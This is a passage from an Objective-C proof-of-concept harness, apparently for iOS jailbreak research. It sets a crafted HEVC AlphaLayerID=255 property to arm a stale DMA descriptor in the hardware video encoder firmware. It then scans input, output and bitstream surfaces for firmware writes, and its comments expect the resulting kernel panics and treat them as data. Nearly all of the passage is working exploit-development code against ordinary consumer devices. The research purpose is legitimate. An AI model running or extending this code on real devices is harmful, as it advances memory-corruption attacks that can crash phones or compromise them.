    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d (%s)", (int)status,
        status == noErr ? "submitted" : "error");

    // Wait for the encode timeout callback (-17691)
    LOG(@"Waiting for -17691 encode timeout (up to 130s)...");
    for (int w = 0; w < 130; w++) {
        [NSThread sleepForTimeInterval:1.0];
        if (g_narrowGotOutput) break;
        if (w > 0 && w % 30 == 0) {
            INFO(@"Still waiting for callback... T+%ds", w);
        }
    }

    BOOL armed = !g_narrowGotOutput;
    INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
    os_log(dLog, "JBPoC-DPREP-ARMED %{public}@", armed ? @"YES" : @"NO");

    if (!armed) {
        INFO(@"WARNING: Got output (no -17691). Continuing readout anyway.");
    }

    // Re-snapshot input surface AFTER encode submission (firmware may have modified it)
    LOG(@"Re-snapshotting input surface post-encode...");
    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
    uint8_t *postY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    uint8_t *postUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    int prePostDiffs = 0;
    for (size_t i = 0; i < ySize; i++) {
        if (postY[i] != snapshot[i]) prePostDiffs++;
    }
    for (size_t i = 0; i < uvSize; i++) {
        if (postUV[i] != snapshot[ySize + i]) prePostDiffs++;
    }
    if (prePostDiffs > 0) {
        PASS(@"Input surface already modified by encode! %d bytes differ pre→post-arm", prePostDiffs);
        os_log(dLog, "JBPoC-DPREP-PRE-POST-DIFF %d", prePostDiffs);
    } else {
        INFO(@"Input surface unchanged by encode submission.");
    }
    // Use post-encode state as the baseline for the readout loop
    memcpy(snapshot, postY, ySize);
    memcpy(snapshot + ySize, postUV, uvSize);
    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);

    // Also re-snapshot all extra surfaces post-encode
    for (int si = 0; si < extraCount; si++) {
        IOSurfaceLock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
        uint8_t *curExtra = (uint8_t *)IOSurfaceGetBaseAddress(extraSurfs[si]);
        if (curExtra) {
            int eDiffs = 0;
            for (size_t i = 0; i < extraSizes[si]; i++) {
                if (curExtra[i] != extraSnapshots[si][i]) eDiffs++;
            }
            if (eDiffs > 0) {
                PASS(@"Extra surf ID=%u modified by encode! %d bytes differ", extraSurfIDs[si], eDiffs);
            }
            memcpy(extraSnapshots[si], curExtra, extraSizes[si]);
        }
        IOSurfaceUnlock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
    }

    // Step 4: READOUT LOOP — scan surfaces every 5s for changes
    LOG(@"--- STEP 4: READOUT LOOP (180s, every 5s) ---");
    LOG(@"Watching for firmware DMA writes into mapped surfaces...");
    os_log(dLog, "JBPoC-DPREP-READOUT-START");
    pocLog(@"");

    int hitCount = 0;
    int firstHitTime = -1;

    for (int tick = 1; tick <= 36; tick++) {  // 36 * 5s = 180s
        [NSThread sleepForTimeInterval:5.0];

        int elapsed = tick * 5;
        NSString *now = [fmt stringFromDate:[NSDate date]];

        // Re-read the pixel buffer
        CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
        uint8_t *curY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
        uint8_t *curUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);

        // Diff Y plane
        int yDiffs = 0;
        int firstYOff = -1;
        uint8_t firstYOld = 0, firstYNew = 0;
        for (size_t i = 0; i < ySize; i++) {
            if (curY[i] != snapshot[i]) {
                if (yDiffs == 0) {
                    firstYOff = (int)i;
                    firstYOld = snapshot[i];
                    firstYNew = curY[i];
                }
                yDiffs++;
            }
        }

        // Diff UV plane
        int uvDiffs = 0;
        int firstUVOff = -1;
        uint8_t firstUVOld = 0, firstUVNew = 0;
        for (size_t i = 0; i < uvSize; i++) {
            if (curUV[i] != snapshot[ySize + i]) {
                if (uvDiffs == 0) {
                    firstUVOff = (int)i;
                    firstUVOld = snapshot[ySize + i];
                    firstUVNew = curUV[i];
                }
                uvDiffs++;
            }
        }

        CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);

        if (yDiffs > 0 || uvDiffs > 0) {
            hitCount++;
            if (firstHitTime < 0) firstHitTime = elapsed;

            PASS(@"*** HIT at T+%ds (%@) ***", elapsed, now);
            if (yDiffs > 0) {
                LOG(@"  Y plane: %d bytes changed, first at offset 0x%x (0x%02x→0x%02x)",
                    yDiffs, firstYOff, firstYOld, firstYNew);
            }
            if (uvDiffs > 0) {
                LOG(@"  UV plane: %d bytes changed, first at offset 0x%x (0x%02x→0x%02x)",
                    uvDiffs, firstUVOff, firstUVOld, firstUVNew);
            }
            os_log(dLog, "JBPoC-DPREP-HIT T+%ds yDiff=%d uvDiff=%d firstY=0x%x firstUV=0x%x",
                   elapsed, yDiffs, uvDiffs, firstYOff, firstUVOff);

            // Dump first 64 changed bytes for analysis
            if (yDiffs > 0) {
                CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
                uint8_t *dumpY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
                NSMutableString *hex = [NSMutableString string];
                int dumped = 0;
                for (size_t i = (size_t)firstYOff; i < ySize && dumped < 64; i++) {
                    if (dumpY[i] != snapshot[i]) {
                        [hex appendFormat:@"%04zx:%02x→%02x ", i, snapshot[i], dumpY[i]];
                        dumped++;
                    }
                }
                CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
                LOG(@"  Y diff dump: %@", hex);
            }

            // Update snapshot to track incremental changes
            CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
            memcpy(snapshot, CVPixelBufferGetBaseAddressOfPlane(pb, 0), ySize);
            memcpy(snapshot + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
            CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);

        }

        // Also diff extra IOSurfaces (output/reference surfaces)
        for (int si = 0; si < extraCount; si++) {
            IOSurfaceLock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
            uint8_t *curExtra = (uint8_t *)IOSurfaceGetBaseAddress(extraSurfs[si]);
            if (curExtra) {
                int eDiffs = 0;
                int firstEOff = -1;
                uint8_t firstEOld = 0, firstENew = 0;
                for (size_t i = 0; i < extraSizes[si]; i++) {
                    if (curExtra[i] != extraSnapshots[si][i]) {
                        if (eDiffs == 0) {
                            firstEOff = (int)i;
                            firstEOld = extraSnapshots[si][i];
                            firstENew = curExtra[i];
                        }
                        eDiffs++;
                    }
                }
                if (eDiffs > 0) {
                    hitCount++;
                    if (firstHitTime < 0) firstHitTime = elapsed;
                    PASS(@"*** EXTRA SURF HIT: ID=%u at T+%ds ***", extraSurfIDs[si], elapsed);
                    LOG(@"  %d bytes changed (of %zu), first at 0x%x (0x%02x→0x%02x)",
                        eDiffs, extraSizes[si], firstEOff, firstEOld, firstENew);

                    // Dump first 32 changed bytes
                    NSMutableString *hex = [NSMutableString string];
                    int dumped = 0;
                    for (size_t i = (size_t)firstEOff; i < extraSizes[si] && dumped < 32; i++) {
                        if (curExtra[i] != extraSnapshots[si][i]) {
                            [hex appendFormat:@"%04zx:%02x→%02x ", i, extraSnapshots[si][i], curExtra[i]];
                            dumped++;
                        }
                    }
                    LOG(@"  Diff: %@", hex);

                    os_log(dLog, "JBPoC-DPREP-EXTRA-HIT sid=%u T+%ds diffs=%d first=0x%x",
                           extraSurfIDs[si], elapsed, eDiffs, firstEOff);

                    // Update snapshot
                    memcpy(extraSnapshots[si], curExtra, extraSizes[si]);
                }
            }
            IOSurfaceUnlock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
        }

        if (yDiffs == 0 && uvDiffs == 0) {
            BOOL anyExtra = NO;
            for (int si = 0; si < extraCount && !anyExtra; si++) {
                // already handled above; just gate the "no change" line
                // (hitCount would have incremented)
            }
            if (elapsed <= 30 || elapsed % 30 == 0) {
                INFO(@"T+%03ds (%@): no change (input + %d extras)", elapsed, now, extraCount);
            }
        }
    }

    // Step 5: Summary
    pocLog(@"");
    LOG(@"═══════════════════════════════════════════");
    if (hitCount > 0) {
        PASS(@"*** MODEL (b) CONFIRMED ***");
        LOG(@"Firmware DMA writes detected in mapped surface!");
        LOG(@"Total readout hits: %d, first at T+%ds", hitCount, firstHitTime);
        LOG(@"The write is ALREADY landing — no race needed.");
        LOG(@"The panic at ~160s is just the mapping going away.");
        os_log(dLog, "JBPoC-DPREP-RESULT MODEL_B_CONFIRMED hits=%d firstAt=%d", hitCount, firstHitTime);
    } else {
        INFO(@"No changes in input or app-visible surfaces.");
        INFO(@"*** Does NOT rule out model (b) ***");
        INFO(@"");
        INFO(@"Interpretation tree (3 branches):");
        INFO(@"1. Bytes changed → model (b) confirmed. (didn't happen)");
        INFO(@"2. No change + fire DVA in EXTERNAL mapping region →");
        INFO(@"   write is deferred (model a); D-proper needed.");
        INFO(@"3. No change + Ghidra says target is INTERNAL surface →");
        INFO(@"   null explained by construction — DARTMapInternalSurfaces");
        INFO(@"   allocates in videocodecd namespace, invisible to app.");
        INFO(@"   D-prep can't distinguish (a) vs (b) for internal surfs.");
        INFO(@"");
        INFO(@"Check the post-run panic .ips DVA against the external-surface");
        INFO(@"DVA range to discriminate branches 2 vs 3.");
        INFO(@"Gating question: Ghidra — which surface index (0-3) does");
        INFO(@"AXI_ID 0xc0 write to? External or internal?");
        os_log(dLog, "JBPoC-DPREP-RESULT NO_HITS check_panic_dva_and_ghidra");
    }
    LOG(@"═══════════════════════════════════════════");

    // Write results to file
    NSString *resultStr = [NSString stringWithFormat:
        @"D-PREP RESULT\nDate: %@\nARM: %@\nArmed: %@\nHits: %d\nFirst hit: T+%ds\nModel: %@\n",
        [NSDate date], armTime, armed ? @"YES" : @"NO",
        hitCount, firstHitTime,
        hitCount > 0 ? @"(b) continuous" : @"(a) deferred"];
    NSString *resultPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/dprep_result.txt"];
    [resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    INFO(@"Results written to %@", resultPath);

    // Clean up — invalidation triggers teardown/unmap, same path as Run A.
    // This WILL likely panic ~160s later (Run A = panic at 160s after invalidate).
    // That panic is expected and its .ips is data: the DVA tells you which PTE
    // the descriptor fired through, confirming the write target was outside the
    // input region if no input hits were detected above.
    LOG(@"Invalidating session — EXPECT PANIC ~160s after this.");
    LOG(@"(Invalidation IS a teardown path. Keep the .ips file!)");
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    free(snapshot);
    CVPixelBufferRelease(pb);

    // Free extra surface snapshots and refs
    for (int si = 0; si < extraCount; si++) {
        free(extraSnapshots[si]);
        CFRelease(extraSurfs[si]);
    }

    g_phase2Running = NO;

    PASS(@"D-PREP readout complete. Expect panic in ~160s (same as Run A).");
    LOG(@"Save the panic .ips — the DVA identifies the write-target surface.");
}

// ============================================================
// D-PREP-2: Output-side monitoring via mid-window canary encode
//
// D-prep monitors the INPUT surface. But the stale descriptor writes
// on AXI_ID 0xc0 (encoder WRITE channel) — the target is likely the
// internal output/bitstream surface. D-prep-2 tests model (b) on
// the OUTPUT side by submitting a clean encode mid-window on the armed
// session, retaining the returned CMSampleBuffer, and checksumming the
// CMBlockBuffer bitstream bytes repeatedly.
//
// WARNING: This is Run-B-style session activity — it perturbs the
// fire timing. Separate sub-run from D-prep, on a fresh boot.
//
// Also: invalidation WILL panic. The .ips is data.
// ============================================================

// D-prep-2 output collection: ring buffer of sample buffers
#define DPREP2_MAX_SAMPLES 128
static CMSampleBufferRef g_dp2Samples[DPREP2_MAX_SAMPLES];
static volatile int g_dp2SampleIdx = 0;
static volatile int g_dp2Errors = 0;
static volatile BOOL g_dp2Armed = NO;

// D-prep-2 retained canary archive: keeps ALL sample buffers from t=0
// (pre-arm baseline through post-arm readout) so we have actual bytes
// if any output goes anomalous — one shot before any potential fire.
#define DPREP2_ARCHIVE_MAX 512
static CMSampleBufferRef g_dp2Archive[DPREP2_ARCHIVE_MAX];
static volatile int g_dp2ArchiveIdx = 0;
static int g_dp2ArchiveArmMark = -1; // index where arming occurred

static void dp2ArchiveSample(CMSampleBufferRef sbuf) {
    if (sbuf && g_dp2ArchiveIdx < DPREP2_ARCHIVE_MAX) {
        CFRetain(sbuf);
        g_dp2Archive[g_dp2ArchiveIdx++] = sbuf;
    }
}

static void dp2FreeArchive(void) {
    for (int i = 0; i < g_dp2ArchiveIdx; i++) {
        if (g_dp2Archive[i]) {
            CFRelease(g_dp2Archive[i]);
            g_dp2Archive[i] = NULL;
        }
    }
    g_dp2ArchiveIdx = 0;
    g_dp2ArchiveArmMark = -1;
}

// Q4 firmware metadata offsets in coded-output buffer (type 0x0b):
// +0xa8 = frame# (u32), +0xac = coded_size (u32), +0x1270 = bitstream start
// These are the sharpest hit signatures — the armed frame's own numbers.
#define DP2_FW_FRAME_OFFSET  0xa8
#define DP2_FW_SIZE_OFFSET   0xac
#define DP2_FW_BS_OFFSET     0x1270
#define DP2_FW_BS_COPY_LEN   0x9400

static void dprep2Callback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status == -17691) {
        g_dp2Armed = YES;
        INFO(@"[D-prep-2] Got -17691 — armed");
        return;
    }
    if (status != noErr) {
        g_dp2Errors++;
        return;
    }
    if (sampleBuffer && g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
        CFRetain(sampleBuffer);
        g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
        g_dp2SampleIdx++;
        dp2ArchiveSample(sampleBuffer);
    }
}

// Isolated trigger-session callback — any error without a sample = arm
static volatile int g_dp2ArmedStatus = 0;

static void dprep2TriggerCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    INFO(@"[TRIGGER-CB] status=%d sampleBuffer=%s",
         (int)status, sampleBuffer ? "YES" : "NULL");
    if (status != noErr && !sampleBuffer) {
        g_dp2Armed = YES;
        g_dp2ArmedStatus = (int)status;
        if (status == -17691) {
            PASS(@"[TRIGGER-CB] -17691 — classic arm");
        } else {
            PASS(@"[TRIGGER-CB] %d — alternate arm signature, continuing",
                 (int)status);
        }
        return;
    }
    if (status == noErr && sampleBuffer) {
        FAIL(@"[TRIGGER-CB] encode SUCCEEDED — Alpha=255 not taken");
    }
}

// Isolated observation-session callback — tracks cross-session rejection
static volatile int g_dp2ObsRejectCount = 0;

static void dprep2ObsCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status == -17691) {
        g_dp2ObsRejectCount++;
        INFO(@"[OBS-CB] -17691 (#%d) — cross-session HEVC rejection",
             g_dp2ObsRejectCount);
        return;
    }
    if (status != noErr) {
        g_dp2Errors++;
        INFO(@"[OBS-CB] error: %d", (int)status);
        return;
    }
    if (sampleBuffer && g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
        CFRetain(sampleBuffer);
        g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
        g_dp2SampleIdx++;
        dp2ArchiveSample(sampleBuffer);
    }
}

static NSData *dp2ExtractBitstream(CMSampleBufferRef sbuf) {
    if (!sbuf) return nil;
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
    if (!block) return nil;
    size_t len = CMBlockBufferGetDataLength(block);
    if (len == 0) return nil;
    NSMutableData *data = [NSMutableData dataWithLength:len];
    CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
    return data;
}

static void dp2FreeSamples(void) {
    for (int i = 0; i < g_dp2SampleIdx; i++) {
        if (g_dp2Samples[i]) {
            CFRelease(g_dp2Samples[i]);
            g_dp2Samples[i] = NULL;
        }
    }
    g_dp2SampleIdx = 0;
    g_dp2Errors = 0;
}

static NSData *dp2ExtractFullBlock(CMSampleBufferRef sbuf) {
    if (!sbuf) return nil;
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
    if (!block) return nil;
    size_t totalLen = CMBlockBufferGetDataLength(block);
    if (totalLen == 0) return nil;
    NSMutableData *data = [NSMutableData dataWithLength:totalLen];
    CMBlockBufferCopyDataBytes(block, 0, totalLen, data.mutableBytes);
    return data;
}

static void runDPrep2(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    os_log_t dLog = os_log_create("com.jbpoc.dprep2", "output-readout");

    pocLog(@"");
    pocLog(@"╔═══════════════════════════════════════════╗");
    pocLog(@"║  D-PREP-2 v4: TWO-SESSION (Alpha→Prepare) ║");
    pocLog(@"║  Canary → trigger(255) → obs(clean) →    ║");
    pocLog(@"║  continuous canary on obs (train+test)    ║");
    pocLog(@"║  T+0-45s = envelope training set          ║");
    pocLog(@"║  T+60s+  = test set (fire expected 90-160)║");
    pocLog(@"║  *** WILL PANIC ~90-160s after arm ***    ║");
    pocLog(@"╚═══════════════════════════════════════════╝");
    pocLog(@"");

    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss.SSS";

    // Step 1: Canary on a throwaway session (proves AVE2 is alive)
    LOG(@"--- STEP 1: CANARY ---");
    os_log(dLog, "JBPoC-DPREP2v3-CANARY-START");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK.");
    idleWait(5, @"canary cooldown");

    // Step 2: CREATE TRIGGER SESSION + ARM
    // Alpha MUST be set BEFORE PrepareToEncodeFrames — VPS is generated
    // at prepare time. Late SET stores the value (readback works) but
    // doesn't regenerate VPS, so firmware never sees it → no -17691.
    // This matches the working phase2Encode topology exactly.
    LOG(@"--- STEP 2: TRIGGER SESSION (Alpha before Prepare) ---");

    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef triggerSession = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        dprep2TriggerCallback, NULL, &triggerSession);

    if (status != noErr) {
        FAIL(@"Trigger session creation failed: %d", (int)status);
        g_phase2Running = NO;
        return;
    }

    // SET Alpha BEFORE Prepare — VPS generated at prepare time
    status = VTSessionSetProperty(triggerSession,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(255));
    INFO(@"SET AlphaLayerID=255 (pre-prepare): %s", status == noErr ? "OK" : "REJECTED");

    NSDate *prepStart = [NSDate date];
    status = VTCompressionSessionPrepareToEncodeFrames(triggerSession);
    NSTimeInterval prepDur = [[NSDate date] timeIntervalSinceDate:prepStart];
    INFO(@"PrepareToEncodeFrames: %d (%.3fs)", (int)status, prepDur);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d (after %.3fs)", (int)status, prepDur);
        VTCompressionSessionInvalidate(triggerSession);
        CFRelease(triggerSession);
        g_phase2Running = NO;
        return;
    }

    // Readback verify
    CFTypeRef readback = NULL;
    VTSessionCopyProperty(triggerSession,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        kCFAllocatorDefault, &readback);
    if (readback) {
        int rbVal = [(__bridge NSNumber *)readback intValue];
        if (rbVal == 255) {
            PASS(@"Readback verify: AlphaLayerID=%d (confirmed)", rbVal);
        } else {
            FAIL(@"Readback MISMATCH: expected 255, got %d", rbVal);
        }
        CFRelease(readback);
    } else {
        INFO(@"Readback: property not readable (SET may still have stuck)");
    }

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"Pixel buffer failed");
        VTCompressionSessionInvalidate(triggerSession);
        CFRelease(triggerSession);
        g_phase2Running = NO;
        return;
    }

    dp2FreeSamples();
    dp2FreeArchive();
    g_dp2Armed = NO;
    g_dp2ArmedStatus = 0;

    // ARM: frame 0 — session's FIRST frame, matching phase2Encode topology
    g_dp2ArchiveArmMark = g_dp2ArchiveIdx;
    NSString *armTime = [fmt stringFromDate:[NSDate date]];
    LOG(@"ARM time: %@ (archive mark: %d)", armTime, g_dp2ArchiveArmMark);
    os_log(dLog, "JBPoC-DPREP2v4-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);

    CMTime armPTS = CMTimeMake(0, 30);
    NSDate *encStart = [NSDate date];
    status = VTCompressionSessionEncodeFrame(triggerSession, pb,
        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
    NSTimeInterval encDur = [[NSDate date] timeIntervalSinceDate:encStart];
    INFO(@"EncodeFrame: %d (%.3fs)", (int)status, encDur);

    NSDate *cfStart = [NSDate date];
    VTCompressionSessionCompleteFrames(triggerSession, kCMTimeInvalid);
    NSTimeInterval cfDur = [[NSDate date] timeIntervalSinceDate:cfStart];
    INFO(@"CompleteFrames: (%.3fs)", cfDur);

    // Wait for -17691
    LOG(@"Waiting for -17691 (up to 130s)...");
    for (int w = 0; w < 130; w++) {
        [NSThread sleepForTimeInterval:1.0];
        if (g_dp2Armed) break;
        if (w > 0 && w % 30 == 0) {
            INFO(@"Still waiting... T+%ds", w);
        }
    }

    if (!g_dp2Armed) {
        FAIL(@"Arm not detected after 130s (encodeFrame returned %d).", (int)status);
        LOG(@"Logging as no-fire run. Alpha set pre-prepare, frame 0.");
        LOG(@"NOT invalidating — trigger session stays alive.");
        LOG(@"If panic comes at ~160s, this is a watchdog-path variant.");

        NSString *noFireResult = [NSString stringWithFormat:
            @"D-PREP-2 v4 NO-ARM\nDate: %@\nARM attempt: %@\n"
            @"Condition: -17691 not received in 130s\n"
            @"Session: frame 0, Alpha pre-prepare\n"
            @"Archive: %d samples\n",
            [NSDate date], armTime, g_dp2ArchiveIdx];
        NSString *noFirePath = [NSHomeDirectory()
            stringByAppendingPathComponent:@"Documents/dprep2_nofire.txt"];
        [noFireResult writeToFile:noFirePath atomically:YES
                         encoding:NSUTF8StringEncoding error:nil];

        // Do NOT invalidate — leave trigger session alive, keep PTEs mapped
        // If panic comes later, the .ips is still valid data
        g_phase2Running = NO;
        return;
    }
    PASS(@"Armed (status=%d). Firmware DMA descriptor is stale-armed.", g_dp2ArmedStatus);
    os_log(dLog, "JBPoC-DPREP2v4-ARMED status=%d", g_dp2ArmedStatus);

    // Step 3: OBSERVATION SESSION — continuous canary encode for 240s
    // Trigger session stays alive (PTEs mapped). Observation session is
    // separate (no Alpha) and encodes clean frames for anomaly detection.
    // If DVA reuse puts obs surfaces in trigger's stale-DMA range, we detect it.
    LOG(@"");
    LOG(@"--- STEP 3: OBSERVATION SESSION + READOUT (240s) ---");

    g_dp2ObsRejectCount = 0;

    VTCompressionSessionRef obsSession = NULL;
    status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        dprep2ObsCallback, NULL, &obsSession);
    if (status != noErr) {
        FAIL(@"Observation session creation failed: %d", (int)status);
        LOG(@"Trigger session stays alive — panic may still come.");
        g_phase2Running = NO;
        return;
    }

    NSDate *obsPrepStart = [NSDate date];
    status = VTCompressionSessionPrepareToEncodeFrames(obsSession);
    NSTimeInterval obsPrepDur = [[NSDate date] timeIntervalSinceDate:obsPrepStart];
    INFO(@"Obs PrepareToEncodeFrames: %d (%.3fs)", (int)status, obsPrepDur);
    if (status != noErr) {
        FAIL(@"Observation PrepareToEncode failed: %d (after %.3fs)", (int)status, obsPrepDur);
        VTCompressionSessionInvalidate(obsSession);
        CFRelease(obsSession);
        LOG(@"Trigger session stays alive — panic may still come.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"Observation session ready (no Alpha, clean encode path).");
    LOG(@"Encoding canary frames every 5s on observation session.");
    LOG(@"T+0-45s: training (building envelope).");
    LOG(@"T+60s+:  testing (diffing against envelope, Q4 signals active).");
    LOG(@"Trigger session PTEs still valid — watching for cross-session DMA.");
    pocLog(@"");

    int hitCount = 0;
    int firstHitTime = -1;
    int frameNum = 0; // obs session starts at frame 0
    NSDate *armDate = [NSDate date];
    NSMutableString *hitReport = [NSMutableString string];

    // Envelope built from training samples (T+0-45s)
    NSMutableArray *trainBS = [NSMutableArray array];
    size_t baseMaxLen = 0;
    uint8_t *varMin = NULL;
    uint8_t *varMax = NULL;
    #define DPREP2_TRAIN_CUTOFF_S 45
    #define DPREP2_TEST_START_S   60

    // Snapshot input surface for input-side monitoring
    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
    size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
    size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
    size_t ySize = yH * yBpr;
    size_t uvBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
    size_t uvH2 = CVPixelBufferGetHeightOfPlane(pb, 1);
    size_t uvSize = uvH2 * uvBpr;
    size_t inputSize = ySize + uvSize;
    uint8_t *inputSnap = (uint8_t *)malloc(inputSize);
    if (inputSnap) {
        memcpy(inputSnap, CVPixelBufferGetBaseAddressOfPlane(pb, 0), ySize);
        memcpy(inputSnap + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
    }
    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);

    // 48 ticks * 5s = 240s total readout window
    for (int tick = 1; tick <= 48; tick++) {
        [NSThread sleepForTimeInterval:5.0];
        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:armDate];
        NSString *now = [fmt stringFromDate:[NSDate date]];

        // Encode a canary frame on observation session
        dp2FreeSamples();
        CMTime pts = CMTimeMake(frameNum++, 30);
        NSDate *obsEncStart = [NSDate date];
        VTCompressionSessionEncodeFrame(obsSession, pb, pts,
            kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionCompleteFrames(obsSession, kCMTimeInvalid);
        NSTimeInterval obsEncDur = [[NSDate date] timeIntervalSinceDate:obsEncStart];
        [NSThread sleepForTimeInterval:0.5];

        // Re-check elapsed after encode (which may block)
        elapsed = (int)[[NSDate date] timeIntervalSinceDate:armDate];
        now = [fmt stringFromDate:[NSDate date]];

        if (g_dp2SampleIdx > 0) {
            NSData *curBS = dp2ExtractBitstream(g_dp2Samples[0]);

            if (elapsed <= DPREP2_TRAIN_CUTOFF_S) {
                // TRAINING PHASE: T+0 to T+45s — build envelope from these samples
                if (curBS && curBS.length > 0) {
                    [trainBS addObject:curBS];
                    if (curBS.length > baseMaxLen) baseMaxLen = curBS.length;
                    INFO(@"T+%03ds (%@): TRAIN sample %zu (%zu bytes)",
                         elapsed, now, trainBS.count, curBS.length);
                }

                // At the cutoff, build the variance envelope
                if (elapsed >= DPREP2_TRAIN_CUTOFF_S - 5 && !varMin && trainBS.count > 1) {
                    varMin = (uint8_t *)malloc(baseMaxLen);
                    varMax = (uint8_t *)malloc(baseMaxLen);
                    memset(varMin, 0xFF, baseMaxLen);
                    memset(varMax, 0x00, baseMaxLen);
                    for (NSData *bs in trainBS) {
                        const uint8_t *b = bs.bytes;
                        for (size_t j = 0; j < bs.length; j++) {
                            if (b[j] < varMin[j]) varMin[j] = b[j];
                            if (b[j] > varMax[j]) varMax[j] = b[j];
                        }
                    }
                    int inv = 0;
                    for (size_t j = 0; j < baseMaxLen; j++) {
                        if (varMin[j] == varMax[j]) inv++;
                    }
                    PASS(@"Envelope built: %zu training samples, %zu bytes, %d invariant (%.1f%%)",
                         trainBS.count, baseMaxLen, inv, 100.0 * inv / baseMaxLen);
                    os_log(dLog, "JBPoC-DPREP2v4-ENVELOPE train=%zu len=%zu inv=%d",
                           trainBS.count, baseMaxLen, inv);
                }
            } else if (elapsed >= DPREP2_TEST_START_S && curBS && curBS.length > 0) {
                // TEST PHASE: T+60s+ — diff against envelope + Q4 firmware metadata
                const uint8_t *cur = curBS.bytes;
                int anomalies = 0;
                int firstAnom = -1;

                // PRIMARY SIGNAL (Q4): firmware metadata at coded-output offsets
                BOOL fwMetaHit = NO;
                uint32_t fwFrame = 0, fwSize = 0;
                if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                    memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
                    memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
                    // Armed encode was frame 0 on trigger session. If we see
                    // stale frame# in obs session output, DMA crossed sessions.
                    if (fwFrame == 0 && tick > 2) {
                        fwMetaHit = YES;
                        PASS(@"*** Q4 PRIMARY HIT: frame# at +0xa8 = %u (armed frame!) ***",
                             fwFrame);
                    }
                    if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
                        fwMetaHit = YES;
                        PASS(@"*** Q4 SIZE HIT: coded_size at +0xac = %u (baseline max=%zu) ***",
                             fwSize, baseMaxLen);
                    }
                }

                // SECONDARY SIGNAL: variance envelope check
                if (varMin && varMax) {
                    size_t len = MIN(curBS.length, baseMaxLen);
                    for (size_t j = 0; j < len; j++) {
                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
                            if (anomalies == 0) firstAnom = (int)j;
                            anomalies++;
                        }
                    }
                }

                // TERTIARY SIGNAL: +0x1270 region byte deviation
